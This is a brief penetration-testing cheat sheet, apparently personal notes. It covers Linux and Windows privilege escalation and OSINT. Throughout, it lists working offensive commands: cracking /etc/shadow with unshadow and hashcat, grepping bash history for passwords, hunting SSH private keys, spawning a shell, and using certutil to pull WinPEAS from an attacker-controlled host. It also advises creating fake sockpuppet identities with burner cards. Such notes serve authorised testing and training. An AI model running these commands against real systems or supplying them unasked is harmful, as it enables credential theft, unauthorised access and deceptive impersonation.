# Penetration Testing Tradecraft

## Linux Privilege Escalation
Find SUID binaries:
```
find / -type f -perm -4000 2>/dev/null
```

Check GTFOBins for exploits:
```
/home/user/tools/linux-exploit-suggester/linux-exploit-suggester.sh
```

Check password history:
```
cat ~/.bash_history | grep -i passwd
```

Crack /etc/shadow:
```
unshadow /etc/passwd /etc/shadow > unshadowed.txt
hashcat -m 1800 unshadowed.txt rockyou.txt -O
```

Find SSH keys:
```
find / -name authorized_keys 2>/dev/null
find / -name id_rsa 2>/dev/null
```

Check binary capabilities:
```
getcap -r / 2>/dev/null
```
Look for: cap_sys_admin, cap_setuid, cap_setpcap

Spawn TTY shell:
```
python -c 'import pty; pty.spawn("/bin/sh")'
```

## Windows Privilege Escalation
Download files:
```
certutil.exe -urlcache -f http://<lhost>/<filename> <name>
```

Run WinPEAS:
```
certutil -urlcache -f http://<lhost>/winpeas.exe C:\\temp\\winpeas.exe
.\winpeas.exe
```

## General Tradecraft
BurpSuite "Limit Scope" in proxy settings

OSINT sockpuppet creation:
- FakeNameGenerator.com
- ThisPersonDoesNotExist.com
- Privacy.com for burner cards

Search operators:
```
site:<url>, "text", AND, filetype:<ext>, -<not>, intext:<string>
```

Username generation:
```
git clone https://github.com/insidetrust/statistically-likely-usernames.git
```
